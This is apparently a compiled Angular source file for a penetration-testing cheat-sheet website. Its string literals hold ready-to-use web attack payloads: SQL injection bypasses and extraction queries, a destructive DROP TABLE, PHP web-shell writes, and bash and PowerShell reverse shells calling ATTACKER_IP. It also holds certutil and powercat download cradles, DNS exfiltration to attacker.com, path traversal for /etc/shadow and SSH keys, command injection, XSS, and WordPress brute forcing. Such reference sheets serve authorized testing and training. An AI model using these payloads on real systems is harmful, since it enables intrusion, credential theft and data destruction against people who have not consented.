' AND IF(1=1, SLEEP(5), 0) --

# Stacked Queries
'; DROP TABLE users; --

# Requires support for multiple statements
`;sqliTesting=`
# SQL Injection - Initial Testing

# Authentication bypass
' OR 1=1 --
" OR 1=1 --
') OR 1=1 --

# Alternative comparisons
' OR '1'='1
" OR "1"="1

# Delay testing
' OR SLEEP(5) --
' AND SLEEP(5) --

# Comment styles
--
#
/* */
`;sqliFilterBypass=`
# SQL Injection - Filter Bypass

# Common bypass variations
' OR 1=1 -- -
' OR 1=1#
' OR '1'='1'--

# Whitespace bypass
'/**/OR/**/1=1--

# Encoding
%27 OR 1=1 --

# Case manipulation
' oR 1=1 --

# MySQL inline comments
'/*!OR*/1=1--
`;sqliUnion=`
# SQL Injection - UNION Based

# Requirements
# - Same number of columns
# - Compatible data types

# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Basic UNION payload
' UNION SELECT null,null,null --

# System enumeration
' UNION SELECT null, database(), user(), @@version --

# Schema enumeration
' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --
`;sqliBlind=`
# SQL Injection - Blind

# Boolean-based extraction
' AND SUBSTRING(user(),1,1)='a' --

# Character-by-character extraction
' AND ASCII(SUBSTRING(user(),1,1))=97 --

# Time-based extraction
' AND IF(ASCII(SUBSTRING(user(),1,1))=97, SLEEP(5), 0) --

# Boolean logic
' AND 1=1 --
' AND 1=2 --

# Time delay
' AND SLEEP(5) --
`;sqliEnumeration=`
# SQL Injection - Enumeration

# Current database
database()

# Current database user
user()

# Database version
@@version

# Current user
current_user()

# Version
version()

# Information schema
information_schema.tables
information_schema.columns

# Example
' UNION SELECT null, database(), user(), @@version --
`;sqliRce=`
# SQL Injection \u2192 RCE

# Core attack chain
SQLi
\u2192 DB Enumeration
\u2192 File Read / File Write / Command Execution
\u2192 Web Shell
\u2192 Reverse Shell
\u2192 System Access


# ==========================================
# LINUX - MYSQL / MARIADB
# ==========================================

# Read local files
SELECT LOAD_FILE('/etc/passwd');

# Useful targets
/etc/passwd
/etc/shadow
/var/www/html/config.php
/home/user/.ssh/id_rsa

# Write PHP web shell
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

# Trigger commands
http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami

# Listener
nc -lvnp 4444

# Trigger reverse shell
http://TARGET/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'


# ==========================================
# POSTGRESQL
# ==========================================

# Command execution
COPY (SELECT '') TO PROGRAM 'id';

# Reverse shell
COPY (SELECT '') TO PROGRAM
'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';


# ==========================================
# WINDOWS - MSSQL
# ==========================================

# Command execution
EXEC xp_cmdshell 'whoami';

EXEC xp_cmdshell 'ipconfig';

EXEC xp_cmdshell 'net user';

# Enable xp_cmdshell if required
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;


# ==========================================
# POWERSHELL
# ==========================================

# Listener
nc -lvnp 4444

# PowerShell reverse shell
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
}';


# ==========================================
# FILE DOWNLOAD
# ==========================================

# Download payload using certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f
http://ATTACKER_IP/nc.exe C:WindowsTemp
c.exe';


# Spawn netcat shell
EXEC xp_cmdshell 'C:WindowsTemp
c.exe ATTACKER_IP 4444 -e cmd.exe';


# ==========================================
# ATTACK CHAIN
# ==========================================

SQLi
\u2192 File Read
\u2192 File Write
\u2192 Web Shell
\u2192 Command Execution
\u2192 Reverse Shell
\u2192 Privilege Escalation
`;sqliOob=`
# Out-of-Band (OOB) SQL Injection

# Used when no direct output is visible.

# MySQL file/DNS-style request
SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', database()));

# OOB techniques can use:
# - DNS exfiltration
# - HTTP requests
# - External callbacks
`;sqliFlow=`
# SQL Injection - Practical Exploitation Flow

# 1. Detect injection point
'
"
boolean change

# 2. Identify SQLi type
Error-based
Union-based
Blind
Time-based
Stacked

# 3. Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# 4. Extract DB information
database()
user()
@@version()

# 5. Enumerate schema
information_schema.tables
information_schema.columns

# 6. Enumerate users / privileges

# 7. Test file read / file write

# 8. Test command execution

# 9. Obtain shell if possible

# 10. Continue with privilege escalation
`;sqliNotes=`
# SQL Injection - Important Notes

# Always confirm the injection type before testing large payloads.

# Blind SQLi is common in modern applications.

# WAF bypass requires adapting the payload to the filter.

# Identify the DBMS before using DB-specific syntax.

# Common DBMS
MySQL / MariaDB
MSSQL
PostgreSQL

# RCE depends heavily on database privileges.

# MySQL FILE privilege can be critical.

# xp_cmdshell may be disabled in MSSQL.

# SQLi does not automatically mean RCE.

# Typical attack chain
SQLi
\u2192 Enumeration
\u2192 Data Extraction
\u2192 File Read / Write
\u2192 Command Execution
\u2192 Shell
\u2192 Privilege Escalation
`;fileInclusionWorkflow=`
# File Inclusion Workflow

# 1. Identify potentially vulnerable parameters
page=
file=
path=
include=
template=
lang=

# 2. Confirm LFI
../../../../etc/passwd

# 3. Try Windows files
../../../../boot.ini
../../../../Windows/System32/drivers/etc/hosts

# 4. Attempt source disclosure
php://filter/convert.base64-encode/resource=index.php

# 5. Look for useful files
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/www/html/config.php

# 6. Test log poisoning

# 7. Test PHP wrappers

# 8. If remote inclusion is possible, test RFI

# 9. Escalate to code execution where applicable
`;directoryTraversal=`
# Basic directory traversal
http://<IP>/index.php?page=../../../../etc/passwd
http://<IP>/index.php?page=../../../../../../Windows/System32/drivers/etc/hosts
http://<IP>/index.php?page=../../../../home/<user>/.ssh/id_rsa
`;directoryTraversalParameters=`
# Potentially vulnerable parameters
page=, file=, path=, doc=, folder=, include=, lang=, template=

# Establish the expected value and test traversal
http://<IP>/index.php?page=about.html
http://<IP>/index.php?page=../../../../etc/passwd
`;directoryTraversalPayloads=`
# Basic / deep traversal
../../../../etc/passwd
../../../../../../../../etc/passwd

# Windows
........WindowsSystem32driversetchosts

# Legacy null byte
../../../../etc/passwd%00

# URL encoding and double encoding
%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f

# Mixed encoding and obfuscation
%2e%2e/%2e%2e/etc/passwd
....//....//....//etc/passwd
..../..../..../etc/passwd
..../..../..../..../etc/passwd
../.././../.././etc/passwd
../../../../etc//passwd
../../../../etc/./passwd
`;directoryTraversalFiles=`
# Linux
/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/log/auth.log
/var/www/html/config.php

# Windows
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
`;directoryTraversalTools=`
# curl
curl "http://<IP>/index.php?page=../../../../etc/passwd"

# Burp Suite: intercept, modify the parameter, and send the payload.
`;directoryTraversalNotes=`
# Try different traversal depths, encoded and unencoded values, and both slash styles on Windows.
# Check for ../ filtering and normalization; combine with LFI or file inclusion where applicable.
`;webDirectories=`
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

gobuster dir -u http://<IP> \\
-w /usr/share/wordlists/dirb/common.txt

feroxbuster -u http://<IP>
  `;webFiles=`
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt \\
-e .php,.html,.txt,.bak,.zip,.old
  `;webVhosts=`
ffuf -u http://<IP> \\
-H "Host: FUZZ.<DOMAIN>" \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

gobuster vhost -u http://<IP> \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  `;webAuthentication=`
curl -i http://<IP>/login

# Inspect:
# - Login parameters
# - Error messages
# - Username enumeration
# - Rate limiting
# - Authentication tokens
  `;webSessions=`
curl -I http://<IP>/login

# Inspect:
# - Set-Cookie
# - Session identifiers
# - Secure
# - HttpOnly
# - SameSite
  `;webParameters=`
ffuf -u "http://<IP>/page.php?FUZZ=test" \\
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

arjun -u http://<IP>/page.php
  `;sqlInjection=`
sqlmap -u "http://<IP>/page.php?id=1" --batch

sqlmap -u "http://<IP>/page.php?id=1" \\
--dbs --batch
  `;osCommandConcept=`
OS command injection occurs when unsanitized input is incorporated into system commands.
A command such as git clone concatenated with user input may allow additional commands.
  `;osCommandDetection=`
id
whoami
hostname

# POST example
curl -X POST --data 'param=id' http://<IP>/endpoint
  `;osCommandEnumeration=`
# Identify operating system
git version
ver

# Distinguish CMD from PowerShell
(dir 2>&1 *\`|echo CMD);<# rem #>echo PowerShell

# Environment checks
ipconfig
ifconfig
uname -a
  `;osCommandSeparators=`
; ls
&& whoami
| id
& dir

# URL-encoded separators
%3B -> ;
%26%26 -> &&
%7C -> |
git;ipconfig
  `;osCommandBypass=`
git%3Bipconfig
cat\${IFS}/etc/passwd
echo "test"
echo test
$(whoami)
\`id\`
  `;osCommandExploitation=`
Archive=git;whoami
Archive=git;hostname
Archive=git;ipconfig
Archive=git;ifconfig
Archive=git;dir
Archive=git;ls -la
  `;osCommandReverseShell=`
IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER>/powercat.ps1");powercat -c <ATTACKER_IP> -p 4444 -e powershell
nc -nvlp 4444
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."
  `;osCommandNotes=`
# Filters may block separators or command words. Execution context (CMD, PowerShell, Bash) matters.
# Reverse shells require outbound connectivity; test only with authorization.
  `;commandInjection=`
# Identify parameters that may execute system commands.

; id
| id
&& id
|| id
\`id\`
$(id)
  `;reflectedXss=`
<script>alert(1)<\/script>

"><script>alert(1)<\/script>

"><img src=x onerror=alert(1)>
  `;xssPayloadVariants=[{title:"HTML tags and quoted attributes",command:`<!-- Try only when the input is rendered as HTML -->
<script>alert('XSS')<\/script>
"><script>alert(1)<\/script>
"><img src=x onerror=alert(1)>`},{title:"Image events",command:`<!-- Hover proof -->
<img src=x onmouseover="alert('XSS')">

<!-- Broken-image proof -->
<img src=x onerror=alert(1)>`},{title:"SVG events",command:`<svg onload=alert(1)></svg>
<svg/onload=alert('XSS')>`},{title:"HTML5 events",command:`<details open ontoggle=alert(1)>test</details>
<video src=x onerror=alert(1)></video>
<input autofocus onfocus=alert(1)>`},{title:"Encoded output",command:`<!-- Check whether entity-encoded event attributes are decoded before rendering -->
<IMG SRC=x ONERROR=&#97;&#108;&#101;&#114;&#116;(1)>`},{title:"DOM and JavaScript context",command:`<!-- For a value inserted into an HTML fragment -->
#"><img src=x onerror=alert(1)>

<!-- For a JavaScript string context; adapt the quote/terminator to the sink -->
';alert(1)//`}];storedXss=`
# Identify persistent input fields:

- Comments
- Profiles
- Messages
- Tickets
- Usernames

Test whether supplied HTML/JavaScript is stored
and executed when the value is viewed.
  `;domXss=`
# Inspect JavaScript sinks:

innerHTML
outerHTML
document.write()
eval()
setTimeout()
location

# Trace user-controlled input into dangerous sinks.
  `;wordpressFingerprint=`
/wp-login.php
/wp-admin
/wp-content/
/wp-includes/

generator: WordPress
  `;wordpressWpscan=`
wpscan --url http://<IP>
wpscan --url http://<IP> -e vp,u
wpscan --url http://<IP> -e vp,u --api-token="<API_KEY>"
wpscan --url http://<IP> -e t
wpscan --url http://<IP> -e ap,at,tt,cb,dbe,u
  `;wordpressManual=`
curl -s -X GET "http://<IP>/" | grep plugins
curl -s -X GET "http://<IP>/" | grep -oP 'plugins/K[^/]+' | sort -u
  `;wordpressXmlrpc=`
/xmlrpc.php
curl -s -X POST "http://<IP>/xmlrpc.php" -d@file.xml

<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><USERNAME></value></param>
<param><value><PASSWORD></value></param>
</params>
</methodCall>
  `;wordpressAuthentication=`
/wp-login.php
/wp-admin
wpscan --url http://<IP> -U <USERNAME> -P <WORDLIST>
hydra -l <USERNAME> -P <WORDLIST> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
  `;wordpressPostEnumeration=`
# Review plugins/themes for vulnerabilities and check for exposed wp-config.php or backups.
# Assess authorized admin capabilities for plugin upload or theme editing.
/wp-content/plugins/
/wp-content/themes/
  `;wordpressWorkflow=`
1. Identify WordPress and fingerprint its components.
2. Enumerate users, plugins, and themes.
3. Research findings and check XML-RPC exposure.
4. Validate authentication only within the authorized scope.
5. Assess administrator capabilities and configuration exposure.
  `;uploadConcept=`
File upload vulnerabilities arise when applications accept files without sufficient validation.
Uploads may expose directory traversal, file overwrite, information disclosure, or privilege escalation.
  `;uploadDetection=`
# Upload a harmless file (for example, test.txt) and check whether it is stored and accessible.
# Upload the same file twice; observe errors or overwrite behavior.
# In Burp Suite, inspect the filename parameter and the response for validation clues.
  `;uploadFilename=`
# Filename manipulation
filename=../../../../../../../test.txt

# Check whether path components are accepted or normalized server-side.
  `;uploadTraversal=`
# Example overwrite target
../../../../../../../root/.ssh/authorized_keys

# Verify impact carefully; unintended overwrites can disrupt the target.
  `;uploadPrivilege=`
# Potential targets, only where writable and in scope
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
Application configuration files
Web server files

# Web services commonly run as www-data or an IIS service identity; verify permissions.
  `;uploadNotes=`
# Behavior depends on server-side validation and web-server permissions.
# Blind overwrites may cause downtime. Test only with explicit authorization.
  `;fileUpload=`
# Test:

- Extension validation
- MIME type validation
- Content validation
- Filename manipulation
- Double extensions
- Path traversal
- Server-side processing

Example:

file.php.jpg
file.phtml
file.php%00.jpg
  `;lfi=`
# Common parameters: page=, file=, path=, doc=, include=, lang=, template=

# Linux and Windows test files
http://<IP>/index.php?page=../../../../etc/passwd
http://<IP>/index.php?page=../../../../boot.ini
http://<IP>/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts

# Typical vulnerable PHP pattern
include($_GET['page']);

# Useful files
/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
/var/log/apache2/access.log
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config
  `;lfiDetection=`
# Confirm LFI by checking whether a known local file is returned.
?page=../../../../../../../../etc/passwd
?page=../../../../../../../../boot.ini

# Common goals: read source/configuration, recover credentials, or assess wrappers and log poisoning.
  `;ssrf=`
# Test server-side URL parameters:

?url=
?uri=
?path=
?dest=
?redirect=
?link=

Example:

http://127.0.0.1
http://localhost
  `;apiDiscovery=`
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt

# Look for:

/api
/api/v1
/api/v2
/swagger
/swagger.json
/openapi.json
/graphql
  `;apiTesting=`
# Test:

- Authentication
- Authorization
- IDOR
- HTTP methods
- Hidden parameters
- Rate limiting
- Input validation

curl -i http://<IP>/api/v1/users
  `;static \u0275fac=function(a){return new(a||r)};static \u0275cmp=f({type:r,selectors:[["app-common-services"]],decls:26,vars:14,consts:[[1,"web-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],[1,"detail"],[4,"ngIf"],[1,"section-description"],[3,"command"],["multi",""],[4,"ngFor","ngForOf"]],template:function(a,p){a&1&&(t(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),n(4,"~/get.sh/"),e(),n(5,"web"),e(),t(6,"h1",4),n(7,"Web"),e(),t(8,"p",5),n(9," Web application reconnaissance, enumeration and common attack techniques. "),e()(),t(10,"div",6)(11,"app-section-index",7),g("sectionChange",function(_){return p.selectWebSection(_)}),e(),t(12,"div",8)(13,"div",9),h(14,F,14,1,"ng-container",10)(15,U,15,2,"ng-container",10)(16,Z,25,4,"ng-container",10)(17,z,40,7,"ng-container",10)(18,A,15,2,"ng-container",10)(19,M,56,11,"ng-container",10)(20,k,45,8,"ng-container",10)(21,N,26,4,"ng-container",10)(22,H,40,7,"ng-container",10)(23,q,35,6,"ng-container",10)(24,j,31,6,"ng-container",10)(25,Q,10,1,"ng-container",10),e()()()()),a&2&&(i(11),o("items",p.sections)("activeId",p.selectedWebSection??""),i(3),o("ngIf",p.selectedWebSection==="recon"),i(),o("ngIf",p.selectedWebSection==="technology"),i(),o("ngIf",p.selectedWebSection==="directories"),i(),o("ngIf",p.selectedWebSection==="wordpress"),i(),o("ngIf",p.selectedWebSection==="authentication"),i(),o("ngIf",p.selectedWebSection==="sqli"),i(),o("ngIf",p.selectedWebSection==="os-command"),i(),o("ngIf",p.selectedWebSection==="xss"),i(),o("ngIf",p.selectedWebSection==="file-upload"),i(),o("ngIf",p.selectedWebSection==="lfi"),i(),o("ngIf",p.selectedWebSection==="fileInclusions"),i(),o("ngIf",p.selectedWebSection==="ssrf"))},dependencies:[I,b,w,R,C,v,P,T,D,W],styles:[".web-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0}.page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.terminal-path[_ngcontent-%COMP%]{font-family:JetBrains Mono,monospace;font-size:13px;color:#64748b;margin-bottom:.75rem}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#7cff00}.title[_ngcontent-%COMP%]{margin:0;font-size:28px;font-weight:600;color:#f8fafc}.page-description[_ngcontent-%COMP%]{margin-top:.5rem;max-width:750px;color:#94a3b8;font-size:14px;line-height:1.6}.grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem}.card[_ngcontent-%COMP%]{display:flex;align-items:flex-start;gap:1rem;padding:1.25rem;background:#0b1220;border:1px solid #1e293b;border-radius:8px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease}.card[_ngcontent-%COMP%]:hover{transform:translateY(-2px);background:#111827;border-color:#334155}.card-icon[_ngcontent-%COMP%]{min-width:38px;height:38px;display:flex;align-items:center;justify-content:center;border:1px solid #1e293b;border-radius:6px;background:#0f172a;color:#7cff00;font-family:JetBrains Mono,monospace;font-size:16px}.card-content[_ngcontent-%COMP%]{min-width:0}.card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .4rem;font-size:16px;font-weight:500;color:#f8fafc}.card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.5}.detail[_ngcontent-%COMP%]{max-width:1000px}.web-section[_ngcontent-%COMP%]{margin-bottom:3rem}.section-header[_ngcontent-%COMP%]{display:flex;align-items:center;width:100%;margin-bottom:1rem}.section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 14px;color:#64748b;font-family:JetBrains Mono,monospace;font-size:11px;font-weight:500;letter-spacing:1.5px;line-height:1;white-space:nowrap}.section-line[_ngcontent-%COMP%]{flex:1;height:1px;background:#1e293b}.back[_ngcontent-%COMP%]{margin-bottom:1.5rem;padding:8px 12px;background:transparent;border:1px solid #1e293b;border-radius:6px;color:#94a3b8;font-family:JetBrains Mono,monospace;font-size:12px;cursor:pointer;transition:.2s}.back[_ngcontent-%COMP%]:hover{background:#1e293b;color:#fff}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .75rem;color:#f8fafc;font-size:22px;font-weight:600}.section-description[_ngcontent-%COMP%]{margin-bottom:1.5rem;max-width:800px;color:#94a3b8;font-size:14px;line-height:1.6}mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:10px;background:#0b1220!important;border:1px solid #1e293b;border-radius:6px!important;box-shadow:none!important}mat-expansion-panel[_ngcontent-%COMP%]:hover{border-color:#334155}mat-panel-title[_ngcontent-%COMP%]{color:#cbd5e1!important;font-family:JetBrains Mono,monospace;font-size:13px}mat-expansion-panel-header[_ngcontent-%COMP%]{height:52px}mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#111827!important}code[_ngcontent-%COMP%]{padding:2px 5px;background:#111827;border:1px solid #1e293b;border-radius:4px;color:#7cff00;font-family:JetBrains Mono,monospace;font-size:12px}@media(max-width:768px){.web-page[_ngcontent-%COMP%]{padding:1rem}.grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.title[_ngcontent-%COMP%]{font-size:24px}}"]})};export{L as Web};
